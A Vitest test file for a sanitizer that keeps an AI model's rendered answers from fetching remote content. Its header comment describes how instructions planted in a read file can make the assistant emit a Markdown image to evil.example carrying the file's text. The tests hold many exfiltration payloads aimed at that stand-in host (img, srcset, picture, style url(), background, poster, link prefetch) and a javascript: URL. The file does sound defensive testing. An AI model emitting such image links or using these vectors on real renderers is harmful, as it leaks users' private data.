// @vitest-environment jsdom
//
// The AI assistant's answer loads nothing from elsewhere (lib/sanitizeHtml,
// the `assistant` policy; #269). jsdom for the reason sanitizeHtml.test.ts
// gives: DOMPurify's own test-suite DOM.
//
// ⚠ Why: a file the assistant reads can steer what it writes. A sentence in a
// document is enough for the answer to hold `![](https://evil.example/?q=<the
// file's words>)`, and the `document` policy drew that picture - the browser
// fetched it, and the words left with the request, nobody clicking anything.

import { describe, expect, it } from 'vitest';
import { localImageSource, sanitizeHtml } from '@brftech/filex-core/src/lib/sanitizeHtml';
import { markdownToSafeHtml } from '@brftech/filex-core/src/lib/markdownHtml';
import { activeContent, VECTORS } from '../fixtures/previewVectors';

function parsed(html: string): HTMLElement {
  const el = document.createElement('div');
  el.innerHTML = html;
  return el;
}

/** Every address in `el` the browser would fetch by itself, drawing it. */
function fetchesFromElsewhere(el: HTMLElement): string[] {
  const out: string[] = [];
  for (const n of Array.from(el.querySelectorAll('*'))) {
    for (const attr of ['src', 'srcset', 'poster', 'background', 'data', 'href']) {
      const v = n.getAttribute(attr);
      if (!v) continue;
      if (attr === 'href' && n.tagName !== 'LINK') continue;
      if (attr === 'src' && localImageSource(v)) continue;
      out.push(`${n.tagName.toLowerCase()} ${attr}=${v}`);
    }
    const style = n.getAttribute('style');
    if (style && /url\s*\(/i.test(style)) out.push(`${n.tagName.toLowerCase()} style=${style}`);
    if (n.tagName === 'PICTURE' || n.tagName === 'SOURCE') out.push(n.tagName.toLowerCase());
  }
  return out;
}

const STOLEN = 'https://evil.example/collect?q=secret%20plans';

describe('sanitizeHtml - assistant', () => {
  for (const [name, html] of Object.entries(VECTORS)) {
    it(`${name} comes out inert`, () => {
      const out = sanitizeHtml(html, 'assistant');
      expect(activeContent(parsed(out))).toEqual([]);
      expect(activeContent(parsed(parsed(out).innerHTML))).toEqual([]);
    });
  }

  it('a remote image in Markdown is never loaded: a link that writes out its address', async () => {
    const html = await markdownToSafeHtml(`Here is the chart: ![chart](${STOLEN})`, 'assistant');
    expect(html).not.toBeNull();
    const el = parsed(html!);
    expect(el.querySelector('img')).toBeNull();
    expect(fetchesFromElsewhere(el)).toEqual([]);
    const link = el.querySelector('a[data-remote-image]')!;
    expect(link.getAttribute('href')).toBe(STOLEN);
    expect(link.getAttribute('rel')).toBe('noopener noreferrer nofollow');
    expect(el.textContent).toContain(STOLEN);
  });

  it('no other way to fetch survives: <img>, srcset, <picture>/<source>, a style url(), background, a protocol-relative address', () => {
    const el = parsed(
      sanitizeHtml(
        `<img src="${STOLEN}" alt="a">` +
          `<img src="data:image/png;base64,iVBORw0KGgo=" srcset="${STOLEN} 2x" alt="d">` +
          `<picture><source srcset="${STOLEN}"><img src="${STOLEN}"></picture>` +
          `<p style="background-image: url(${STOLEN})">x</p>` +
          `<table background="${STOLEN}"><tr><td background="${STOLEN}">t</td></tr></table>` +
          '<img src="//evil.example/p.png">' +
          `<video poster="${STOLEN}"></video><link rel="prefetch" href="${STOLEN}">`,
        'assistant',
      ),
    );
    expect(fetchesFromElsewhere(el)).toEqual([]);
    expect(el.querySelectorAll('img')).toHaveLength(1);
    expect(el.querySelector('img')!.getAttribute('src')).toBe('data:image/png;base64,iVBORw0KGgo=');
    expect(el.querySelector('[style]')).toBeNull();
  });

  it('a data: image and one from filex itself are drawn', () => {
    const own = `${location.origin}/api/files/manager?action=download&path=main%3A%2F%2Fa.png`;
    const el = parsed(
      sanitizeHtml(
        `<img src="data:image/png;base64,iVBORw0KGgo=" alt="d"><img src="${own}" alt="o"><img src="/api/files/read?path=x.png" alt="r">`,
        'assistant',
      ),
    );
    expect([...el.querySelectorAll('img')].map((i) => i.getAttribute('alt'))).toEqual(['d', 'o', 'r']);
    expect(localImageSource(`blob:${location.origin}/7a0c-11`)).toBe(true);
    expect(localImageSource('blob:https://evil.example/7a0c-11')).toBe(false);
    expect(localImageSource('javascript:alert(1)')).toBe(false);
  });

  it('a link opens in a new tab, sends nothing along, and says where it goes', () => {
    const el = parsed(sanitizeHtml(`<a href="${STOLEN}">the report</a> and <a href="https://example.test/">https://example.test/</a>`, 'assistant'));
    const [hidden, plain] = [...el.querySelectorAll('a')];
    for (const a of [hidden, plain]) {
      expect(a.getAttribute('target')).toBe('_blank');
      expect(a.getAttribute('rel')).toBe('noopener noreferrer nofollow');
    }
    expect(hidden.nextElementSibling?.textContent).toBe(` (${STOLEN})`);
    expect(plain.nextElementSibling).toBeNull();
  });

  it("a file's preview may draw a remote picture once the person allows it; the assistant's answer never does", () => {
    // The document policy holds it behind a placeholder until the person asks
    // (sanitizeRemoteImages.test.ts); the assistant's has no such door.
    const allowed = parsed(sanitizeHtml(`<img src="${STOLEN}" alt="a">`, 'document', { remoteImages: { load: () => true } }));
    expect(allowed.querySelector('img')!.getAttribute('src')).toBe(STOLEN);
    expect(parsed(sanitizeHtml(`<img src="${STOLEN}" alt="a">`, 'assistant')).querySelector('img')).toBeNull();
  });
});
